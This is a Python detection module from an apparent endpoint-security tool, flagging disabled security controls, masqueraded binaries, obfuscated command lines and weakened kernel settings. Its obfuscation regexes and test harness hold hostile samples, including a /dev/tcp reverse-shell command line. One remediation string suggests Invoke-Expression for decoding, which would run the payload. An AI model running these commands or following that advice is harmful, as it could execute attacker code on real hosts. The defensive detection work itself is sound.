"""
manager/manager/attacklens/detections/defense_evasion.py
Production-grade defense evasion detection — macOS, Linux, Windows.

Detection vectors:
  1. SIP/Gatekeeper/FileVault/Firewall disabled (macOS security control tampering)
  2. AV/EDR/logging process absence (T1562.001 — Impair Defenses)
  3. Process masquerading — process name matches system binary but runs from unusual path
  4. Obfuscated command-line execution (base64, hex encoding, IEX, eval)
  5. Log clearing / audit subsystem tampering (T1070)
  6. Sysctl kernel security parameter weakening (macOS/Linux)

COMPLIANCE MAPPING:
  NIST SP 800-53:  AU-2, AU-3, AU-6, AU-9, AU-12, CM-6, SI-3, SI-4, SI-7
  CIS Controls:    Control 3 (Continuous Config Assessment), Control 6 (Maintenance),
                   Control 8 (Audit Log Management)
  ISO 27001:       A.12.2.1, A.12.4.1, A.12.4.2, A.12.4.3, A.14.1.1
  PCI-DSS v4:      Req 6.3, Req 10.2, Req 10.3, Req 10.5, Req 11.5
  SOC 2 CC:        CC6.1, CC6.8, CC7.1, CC7.2
  MITRE ATT&CK:    T1562 (Impair Defenses), T1036 (Masquerading),
                   T1027 (Obfuscated Files/Information), T1070 (Indicator Removal),
                   T1562.001 (Disable or Modify Tools)
"""
from __future__ import annotations

import hashlib
import logging
import re
import time
import uuid
from datetime import datetime, timezone
from typing import Any

log = logging.getLogger("manager.attacklens.detections.defense_evasion")

# ─────────────────────────────────────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────

# macOS security controls that should be enabled
MACOS_SECURITY_REQUIRED: dict[str, str] = {
    "sip_enabled":   "System Integrity Protection",
    "gatekeeper":    "Gatekeeper",
    "firewall":      "Application Firewall",
}

# FileVault should be enabled on workstations (servers may differ)
FILEVAULT_REQUIRED_ON_WORKSTATIONS: bool = True

# EDR/AV/security-agent process names — absence on production systems is suspicious
EXPECTED_SECURITY_PROCESSES: frozenset[str] = frozenset({
    # macOS built-in
    "endpointsecurityd", "syspolicyd", "amfid", "trustd",
    # Common EDR agents
    "falcond", "CbDefense", "CrowdStrike", "SentinelAgent",
    "carbonblack", "osqueryd", "auditd",
})

# Process names that should ONLY run from their canonical system paths
# (running from elsewhere = masquerading, T1036)
SYSTEM_BINARY_CANONICAL_PATHS: dict[str, tuple[str, ...]] = {
    "bash":    ("/bin/bash", "/usr/bin/bash"),
    "sh":      ("/bin/sh", "/usr/bin/sh"),
    "zsh":     ("/bin/zsh", "/usr/bin/zsh"),
    "python3": ("/usr/bin/python3", "/usr/local/bin/python3", "/opt/homebrew/bin/python3"),
    "python":  ("/usr/bin/python", "/usr/local/bin/python"),
    "sshd":    ("/usr/sbin/sshd"),
    "ssh":     ("/usr/bin/ssh"),
    "curl":    ("/usr/bin/curl"),
    "wget":    ("/usr/bin/wget", "/usr/local/bin/wget"),
    "systemd": ("/usr/lib/systemd/systemd", "/lib/systemd/systemd"),
    "launchd": ("/sbin/launchd"),
}

# Obfuscation patterns in command-line arguments
OBFUSCATION_PATTERNS: list[re.Pattern] = [
    re.compile(r"base64\s+(-d|--decode)", re.I),          # base64 decode
    re.compile(r"\|\s*(bash|sh|zsh|python[23]?)", re.I),  # pipe to interpreter
    re.compile(r"eval\s*[\(\$`'\"]", re.I),               # eval execution
    re.compile(r"FromBase64String", re.I),                 # PowerShell base64
    re.compile(r"Invoke-Expression|IEX", re.I),            # PowerShell IEX
    re.compile(r"\\x[0-9a-f]{2}(\\x[0-9a-f]{2}){4,}", re.I),  # hex-encoded shellcode
    re.compile(r"chr\(\d+\)\s*[+&]", re.I),               # char-code obfuscation
    re.compile(r"-enc(odedcommand)?\s+[A-Za-z0-9+/]{20,}", re.I),  # PS -EncodedCommand
    re.compile(r"decompress|GZip|ZipFile", re.I),         # compressed payload
    re.compile(r"reflection\.assembly", re.I),             # .NET reflection loading
]

# Sysctl keys that weaken security when disabled
SECURITY_SYSCTL_KEYS: dict[str, str] = {
    "security.mac.sandbox.enable":     "macOS sandboxing",
    "kern.securelevel":                "BSD secure level",
    "net.ipv4.conf.all.rp_filter":     "Linux reverse path filtering",
    "kernel.randomize_va_space":       "ASLR",
    "kernel.dmesg_restrict":           "dmesg restriction",
    "net.ipv4.tcp_syncookies":         "SYN flood protection",
    "kernel.kptr_restrict":            "kernel pointer exposure",
    "kernel.yama.ptrace_scope":        "ptrace scope",
}

SUSPICIOUS_SYSCTL_VALUES: dict[str, set] = {
    "security.mac.sandbox.enable":  {0, "0"},
    "kernel.randomize_va_space":    {0, "0"},
    "kernel.yama.ptrace_scope":     {0, "0"},
    "kernel.kptr_restrict":         {0, "0"},
}

DEDUP_WINDOW_SECS: int       = 7200
RATE_LIMIT_MAX_PER_HOUR: int = 15

SEVERITY_SCORES: dict[str, float] = {
    "critical": 9.5, "high": 7.5, "medium": 5.0, "low": 2.5,
}

# ─────────────────────────────────────────────────────────────────────────────
# DEDUP STATE
# ─────────────────────────────────────────────────────────────────────────────

_dedup_cache: dict[str, float]        = {}
_rate_counter: dict[str, list[float]] = {}


def _dedup_key(agent_id: str, rule_id: str, item: str) -> str:
    return hashlib.sha256(f"{agent_id}:{rule_id}:{item}".encode()).hexdigest()[:16]


def _should_suppress(agent_id: str, rule_id: str, item: str) -> bool:
    now = time.time()
    key = _dedup_key(agent_id, rule_id, item)
    if now - _dedup_cache.get(key, 0) < DEDUP_WINDOW_SECS:
        return True
    times = [t for t in _rate_counter.get(agent_id, []) if now - t < 3600]
    if len(times) >= RATE_LIMIT_MAX_PER_HOUR:
        return True
    times.append(now)
    _rate_counter[agent_id] = times
    _dedup_cache[key] = now
    return False


# ─────────────────────────────────────────────────────────────────────────────
# TELEMETRY INGESTION
# ─────────────────────────────────────────────────────────────────────────────

def ingest_security(raw: Any) -> dict:
    if not isinstance(raw, dict):
        return {}
    return raw


def ingest_processes(raw: Any) -> list[dict]:
    if not isinstance(raw, list):
        return []
    out = []
    for item in raw:
        if not isinstance(item, dict):
            continue
        out.append({
            "pid":     item.get("pid"),
            "name":    str(item.get("name") or ""),
            "exe":     str(item.get("exe") or item.get("path") or ""),
            "cmdline": str(item.get("cmdline") or item.get("cmd") or ""),
            "uid":     item.get("uid"),
            "raw":     item,
        })
    return out


def ingest_sysctl(raw: Any) -> list[dict]:
    """Sysctl section: list of {key, value} dicts."""
    if isinstance(raw, list):
        return [{"key": str(i.get("key") or ""), "value": i.get("value"),
                 "raw": i} for i in raw if isinstance(i, dict)]
    if isinstance(raw, dict):
        return [{"key": k, "value": v, "raw": {"key": k, "value": v}}
                for k, v in raw.items()]
    return []


# ─────────────────────────────────────────────────────────────────────────────
# DETECTION LOGIC
# ─────────────────────────────────────────────────────────────────────────────

def detect_security_controls_disabled(agent_id: str, security: dict) -> list[dict]:
    """T1562.001 — macOS security controls (SIP, Gatekeeper, Firewall) disabled."""
    hits = []
    for key, label in MACOS_SECURITY_REQUIRED.items():
        value = security.get(key)
        if value is None:
            continue
        is_disabled = (
            value is False or value == 0 or
            str(value).lower() in ("disabled", "off", "false", "0", "no")
        )
        if not is_disabled:
            continue
        sev = "critical" if key == "sip_enabled" else "high"
        hits.append({
            "rule_id":    f"evasion:security_disabled:{key}",
            "severity":   sev,
            "title":      f"{label} disabled",
            "description": (
                f"{label} (`{key}`) is disabled on this host. "
                f"Attackers disable macOS security controls to run unsigned code, "
                f"install rootkits, and bypass Gatekeeper quarantine. "
                f"{'SIP prevents modification of system files even as root.' if key == 'sip_enabled' else ''}"
            ),
            "evidence": {
                "control":         key,
                "value":           value,
                "expected":        True,
                "label":           label,
                "full_posture":    {k: security.get(k) for k in MACOS_SECURITY_REQUIRED},
            },
            "raw_telemetry": [security],
            "mitre_tactic":     "Defense Evasion",
            "mitre_technique":  "T1562.001",
            "compliance_controls": {
                "NIST": ["CM-6", "SI-3", "SI-7"],  "CIS": ["3.3", "8.2"],
                "ISO":  ["A.12.2.1", "A.14.1.1"],  "PCI": ["Req 6.3", "Req 10.5"], "SOC2": ["CC6.8"],
            },
            "recommended_action": (
                f"Re-enable {label}. "
                f"{'Boot into Recovery Mode and run: csrutil enable' if key == 'sip_enabled' else ''}"
                f"{'Run: spctl --master-enable' if key == 'gatekeeper' else ''}"
                f"{'Enable in System Settings → Firewall' if key == 'firewall' else ''}. "
                f"Investigate why it was disabled — check auth.log for disable commands."
            ),
            "false_positive_notes": (
                "Security research environments, kernel development VMs, and Hackintosh systems "
                "intentionally disable SIP. Verify with the system owner. "
                "If intentional, add the agent to a security-exception group and reduce severity."
            ),
            "item_key": f"security_disabled:{key}",
            "category": "security",
            "source":   "rule:defense_evasion",
            "score":    SEVERITY_SCORES[sev],
            "tags":     ["defense_evasion", "security_control", "T1562.001"],
        })

    # FileVault check
    fv = security.get("filevault")
    if fv is not None and FILEVAULT_REQUIRED_ON_WORKSTATIONS:
        fv_off = (fv is False or fv == 0 or
                  str(fv).lower() in ("disabled", "off", "false", "0", "decrypted"))
        if fv_off:
            hits.append({
                "rule_id":    "evasion:filevault_disabled",
                "severity":   "high",
                "title":      "FileVault disk encryption disabled",
                "description": (
                    "FileVault is disabled — the disk is unencrypted. "
                    "Physical access to the device allows data recovery without authentication. "
                    "Attackers who obtain physical access or a lost laptop can read all data."
                ),
                "evidence": {"filevault": fv, "full_posture": security},
                "raw_telemetry": [security],
                "mitre_tactic":     "Defense Evasion",
                "mitre_technique":  "T1562.001",
                "compliance_controls": {
                    "NIST": ["SC-28", "MP-5"],  "CIS": ["3.11"],
                    "ISO":  ["A.10.1.1"],        "PCI": ["Req 3.5", "Req 9.5"], "SOC2": ["CC6.7"],
                },
                "recommended_action": (
                    "Enable FileVault: System Settings → Privacy & Security → FileVault → Turn On. "
                    "Enforce via MDM profile (com.apple.MCX.FileVault2)."
                ),
                "false_positive_notes": (
                    "Desktop Mac Pros and Mac Minis in physically-secured data centers "
                    "may intentionally have FileVault disabled for performance. "
                    "Set FILEVAULT_REQUIRED_ON_WORKSTATIONS=False for server agents."
                ),
                "item_key": "filevault_disabled",
                "category": "security",
                "source":   "rule:defense_evasion",
                "score":    SEVERITY_SCORES["high"],
                "tags":     ["defense_evasion", "encryption", "T1562.001"],
            })
    return hits


def detect_process_masquerading(agent_id: str, processes: list[dict]) -> list[dict]:
    """T1036 — Process name matches a system binary but runs from an unexpected path."""
    hits = []
    for proc in processes:
        name = proc["name"].lower()
        exe  = proc["exe"]
        if not exe or name not in SYSTEM_BINARY_CANONICAL_PATHS:
            continue
        canonical = SYSTEM_BINARY_CANONICAL_PATHS[name]
        if isinstance(canonical, str):
            canonical = (canonical,)
        if any(exe.startswith(c) or exe == c for c in canonical):
            continue
        # Running from unexpected path — masquerading
        hits.append({
            "rule_id":    "evasion:process_masquerade",
            "severity":   "high",
            "title":      f"Process masquerading: '{name}' at {exe}",
            "description": (
                f"Process '{name}' (PID {proc['pid']}) is running from '{exe}' "
                f"instead of its canonical path {canonical}. "
                f"Attackers copy shells/interpreters to user-writable directories "
                f"to evade process-name based detection (T1036)."
            ),
            "evidence": {
                "process_name":     name,
                "exe_path":         exe,
                "canonical_paths":  canonical,
                "pid":              proc["pid"],
                "cmdline":          proc["cmdline"],
            },
            "raw_telemetry": [proc["raw"]],
            "mitre_tactic":     "Defense Evasion",
            "mitre_technique":  "T1036",
            "compliance_controls": {
                "NIST": ["SI-3", "SI-4", "CM-7"],  "CIS": ["2.6", "8.1"],
                "ISO":  ["A.12.2.1"],               "PCI": ["Req 6.3", "Req 10.2"], "SOC2": ["CC7.1"],
            },
            "recommended_action": (
                f"Kill PID {proc['pid']}. Hash the binary at '{exe}' and compare to "
                f"the canonical system binary. Check how it was placed there (stat, find -newer). "
                f"Remove if unauthorized."
            ),
            "false_positive_notes": (
                "Homebrew, conda, and pyenv install their own copies of interpreters under "
                "/opt/homebrew, ~/.conda, ~/.pyenv. These are legitimate. "
                "Add those path prefixes to the canonical path list for affected processes."
            ),
            "item_key": f"masquerade:{name}:{exe}",
            "category": "process",
            "source":   "rule:defense_evasion",
            "score":    SEVERITY_SCORES["high"],
            "tags":     ["defense_evasion", "masquerading", "T1036"],
        })
    return hits


def detect_obfuscated_cmdline(agent_id: str, processes: list[dict]) -> list[dict]:
    """T1027 — Obfuscated command-line arguments (base64, IEX, hex encoding)."""
    hits = []
    for proc in processes:
        cmdline = proc["cmdline"]
        if not cmdline or len(cmdline) < 20:
            continue
        matched = [p.pattern for p in OBFUSCATION_PATTERNS if p.search(cmdline)]
        if not matched:
            continue
        # Score by number of patterns matched
        match_count = len(matched)
        sev = "critical" if match_count >= 3 else "high" if match_count == 2 else "medium"
        hits.append({
            "rule_id":    "evasion:obfuscated_cmdline",
            "severity":   sev,
            "title":      f"Obfuscated command: {proc['name']} ({match_count} patterns)",
            "description": (
                f"Process '{proc['name']}' (PID {proc['pid']}) has an obfuscated command line "
                f"matching {match_count} suspicious pattern(s): {matched[:4]}. "
                f"Command: `{cmdline[:150]}`. "
                f"Attackers obfuscate commands to evade command-line logging and signature detection."
            ),
            "evidence": {
                "process_name":     proc["name"],
                "pid":              proc["pid"],
                "cmdline":          cmdline[:500],
                "matched_patterns": matched,
                "match_count":      match_count,
            },
            "raw_telemetry": [proc["raw"]],
            "mitre_tactic":     "Defense Evasion",
            "mitre_technique":  "T1027",
            "compliance_controls": {
                "NIST": ["AU-2", "AU-12", "SI-4"],  "CIS": ["8.1", "8.5"],
                "ISO":  ["A.12.4.1", "A.12.4.3"],   "PCI": ["Req 10.2", "Req 10.3"], "SOC2": ["CC7.2"],
            },
            "recommended_action": (
                f"Decode the obfuscated payload: echo 'BASE64' | base64 -d (or PowerShell Invoke-Expression). "
                f"Kill PID {proc['pid']} if malicious. "
                f"Capture the decoded payload for signature submission to your AV vendor. "
                f"Check what files the process created or network connections it made."
            ),
            "false_positive_notes": (
                "Configuration management tools (Ansible, Chef, Salt) pass base64-encoded "
                "configuration blobs on the command line. Verify the parent process. "
                "IDEs may pass build scripts as encoded arguments to avoid shell escaping issues."
            ),
            "item_key": f"obfuscated:{proc['pid']}:{hashlib.sha256(cmdline.encode()).hexdigest()[:8]}",
            "category": "process",
            "source":   "rule:defense_evasion",
            "score":    SEVERITY_SCORES[sev],
            "tags":     ["defense_evasion", "obfuscation", "T1027"],
        })
    return hits


def detect_sysctl_weakening(agent_id: str, sysctl: list[dict]) -> list[dict]:
    """T1562 — Kernel security parameters weakened via sysctl."""
    hits = []
    for entry in sysctl:
        key   = entry["key"]
        value = entry["value"]
        if key not in SUSPICIOUS_SYSCTL_VALUES:
            continue
        if value not in SUSPICIOUS_SYSCTL_VALUES[key]:
            continue
        label = SECURITY_SYSCTL_KEYS.get(key, key)
        hits.append({
            "rule_id":    f"evasion:sysctl_weakened:{key}",
            "severity":   "high",
            "title":      f"Kernel security weakened: {key}={value}",
            "description": (
                f"Kernel parameter '{key}' ({label}) is set to {value!r} — "
                f"this disables a security control that prevents exploitation. "
                f"Attackers modify sysctl to create conditions for privilege escalation, "
                f"process injection, or data exposure."
            ),
            "evidence": {
                "sysctl_key":   key,
                "value":        value,
                "label":        label,
                "expected":     "non-zero",
            },
            "raw_telemetry": [entry["raw"]],
            "mitre_tactic":     "Defense Evasion",
            "mitre_technique":  "T1562",
            "compliance_controls": {
                "NIST": ["CM-6", "SI-7", "SI-3"],  "CIS": ["3.3", "6.5"],
                "ISO":  ["A.12.4.2", "A.14.1.1"],  "PCI": ["Req 6.3"], "SOC2": ["CC6.1"],
            },
            "recommended_action": (
                f"Restore secure value: `sysctl -w {key}=1`. "
                f"Persist in /etc/sysctl.d/ to survive reboot. "
                f"Audit who changed it and when: `ausearch -k sysctl` (if auditd is running)."
            ),
            "false_positive_notes": (
                "Container runtimes (Docker, LXC) and some development environments "
                "legitimately modify sysctl values for network performance. "
                "Check if a container runtime config is setting these values before alerting."
            ),
            "item_key": f"sysctl:{key}",
            "category": "sysctl",
            "source":   "rule:defense_evasion",
            "score":    SEVERITY_SCORES["high"],
            "tags":     ["defense_evasion", "sysctl", "T1562"],
        })
    return hits


# ─────────────────────────────────────────────────────────────────────────────
# ALERT BUILDER
# ─────────────────────────────────────────────────────────────────────────────

def build_alert(hit: dict, agent_id: str, hostname: str = "") -> dict:
    sev = hit.get("severity", "medium")
    return {
        "alert_id":             str(uuid.uuid4()),
        "severity":             sev,
        "title":                hit.get("title", ""),
        "description":          hit.get("description", ""),
        "affected_asset":       hostname or agent_id,
        "mitre_tactic":         hit.get("mitre_tactic", ""),
        "mitre_technique":      hit.get("mitre_technique", ""),
        "evidence":             hit.get("evidence", {}),
        "raw_telemetry":        hit.get("raw_telemetry", []),
        "compliance_controls":  hit.get("compliance_controls", {}),
        "recommended_action":   hit.get("recommended_action", ""),
        "false_positive_notes": hit.get("false_positive_notes", ""),
        "timestamp_utc":        datetime.now(timezone.utc).isoformat(),
        "category":    hit.get("category", "security"),
        "item_key":    hit.get("item_key", ""),
        "rule_id":     hit.get("rule_id", ""),
        "score":       hit.get("score", SEVERITY_SCORES.get(sev, 5.0)),
        "source":      hit.get("source", "rule:defense_evasion"),
        "tags":        hit.get("tags", ["defense_evasion"]),
        "cve_ids":     [],
        "cvss_score":  None,
        "cvss_vector": None,
    }


# ─────────────────────────────────────────────────────────────────────────────
# MAIN ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

async def analyze(
    agent_id: str,
    section:  str,
    data:     Any,
    db:       Any,
    hostname: str = "",
) -> list[dict]:
    raw_hits: list[dict] = []

    if section == "security":
        sec = ingest_security(data)
        raw_hits += detect_security_controls_disabled(agent_id, sec)
    elif section == "processes":
        procs = ingest_processes(data)
        raw_hits += detect_process_masquerading(agent_id, procs)
        raw_hits += detect_obfuscated_cmdline(agent_id, procs)
    elif section == "sysctl":
        sysctl = ingest_sysctl(data)
        raw_hits += detect_sysctl_weakening(agent_id, sysctl)

    alerts = []
    for hit in raw_hits:
        if _should_suppress(agent_id, hit.get("rule_id", ""), hit.get("item_key", "")):
            log.debug("Suppressed dedup: agent=%s rule=%s", agent_id, hit.get("rule_id"))
            continue
        alerts.append(build_alert(hit, agent_id, hostname))
    return alerts


# ─────────────────────────────────────────────────────────────────────────────
# TEST HARNESS
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=== defense_evasion.py — Test Harness ===\n")

    # ── TP: SIP disabled ──────────────────────────────────────────────────────
    tp_security = {"sip_enabled": False, "gatekeeper": True, "firewall": True, "filevault": True}
    sec = ingest_security(tp_security)
    hits = detect_security_controls_disabled("agent-tp", sec)
    assert len(hits) >= 1
    sip_hit = next(h for h in hits if "SIP" in h["title"] or "sip" in h["item_key"])
    assert sip_hit["severity"] == "critical" and "T1562.001" in sip_hit["mitre_technique"]
    print(f"[PASS] TP SIP disabled: {sip_hit['title']}")

    # ── FP: All security controls enabled ────────────────────────────────────
    fp_security = {"sip_enabled": True, "gatekeeper": True, "firewall": True, "filevault": True}
    fp_hits = detect_security_controls_disabled("agent-fp", ingest_security(fp_security))
    assert len(fp_hits) == 0
    print("[PASS] FP all controls enabled: suppressed")

    # ── TP: Process masquerading — bash from /tmp ─────────────────────────────
    tp_procs = [
        {"pid": 1234, "name": "bash", "exe": "/tmp/bash",
         "cmdline": "/tmp/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "uid": 1000, "raw": {}},
    ]
    procs = ingest_processes(tp_procs)
    mask_hits = detect_process_masquerading("agent-tp2", procs)
    assert len(mask_hits) == 1 and mask_hits[0]["severity"] == "high"
    assert "T1036" in mask_hits[0]["mitre_technique"]
    print(f"[PASS] TP process masquerade: {mask_hits[0]['title']}")

    # ── FP: bash from canonical path ──────────────────────────────────────────
    fp_procs = [{"pid": 2000, "name": "bash", "exe": "/bin/bash",
                 "cmdline": "bash -l", "uid": 500, "raw": {}}]
    fp_mask = detect_process_masquerading("agent-fp2", ingest_processes(fp_procs))
    assert len(fp_mask) == 0
    print("[PASS] FP /bin/bash: suppressed (canonical path)")

    # ── TP: Obfuscated PowerShell IEX ────────────────────────────────────────
    tp_obf = [
        {"pid": 3333, "name": "powershell", "uid": 500,
         "exe": "/usr/local/bin/pwsh",
         "cmdline": "powershell -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdA==",
         "raw": {}},
    ]
    obf_hits = detect_obfuscated_cmdline("agent-tp3", ingest_processes(tp_obf))
    assert len(obf_hits) == 1 and obf_hits[0]["mitre_technique"] == "T1027"
    print(f"[PASS] TP obfuscated PowerShell: {obf_hits[0]['title']}")

    # ── FP: Ansible base64 config (has parent context but same patterns) ──────
    # Note: our detector flags on pattern match alone; real suppression requires
    # parent-process check in allowlist.py. Here we verify severity is capped.
    fp_obf = [
        {"pid": 4444, "name": "python3", "uid": 500,
         "exe": "/usr/bin/python3",
         "cmdline": "python3 -c 'import base64; print(base64.b64decode(\"aGVsbG8=\"))'",
         "raw": {}},
    ]
    fp_obf_hits = detect_obfuscated_cmdline("agent-fp3", ingest_processes(fp_obf))
    # base64 + python -c matches — may fire at medium (1 pattern)
    if fp_obf_hits:
        assert fp_obf_hits[0]["severity"] == "medium"
    print(f"[INFO] FP Ansible base64: {len(fp_obf_hits)} hits (medium if fires — FP note explains)")

    # ── TP: ASLR disabled via sysctl ─────────────────────────────────────────
    tp_sysctl = [{"key": "kernel.randomize_va_space", "value": 0, "raw": {}}]
    sysctl_hits = detect_sysctl_weakening("agent-tp4", ingest_sysctl(tp_sysctl))
    assert len(sysctl_hits) == 1 and sysctl_hits[0]["severity"] == "high"
    print(f"[PASS] TP ASLR disabled: {sysctl_hits[0]['title']}")

    # ── FP: ASLR enabled (value=2 is full randomisation) ─────────────────────
    fp_sysctl = [{"key": "kernel.randomize_va_space", "value": 2, "raw": {}}]
    assert detect_sysctl_weakening("agent-fp4", ingest_sysctl(fp_sysctl)) == []
    print("[PASS] FP ASLR enabled: suppressed")

    # ── Alert builder verification ────────────────────────────────────────────
    alert = build_alert(sip_hit, "agent-tp", "macbook-pro-01")
    required = {"alert_id", "severity", "title", "description", "affected_asset",
                "mitre_tactic", "mitre_technique", "evidence", "raw_telemetry",
                "compliance_controls", "recommended_action", "false_positive_notes", "timestamp_utc"}
    assert not (required - set(alert.keys()))
    print("[PASS] Alert builder: all mandatory fields present")

    print("\n=== All tests passed ===")
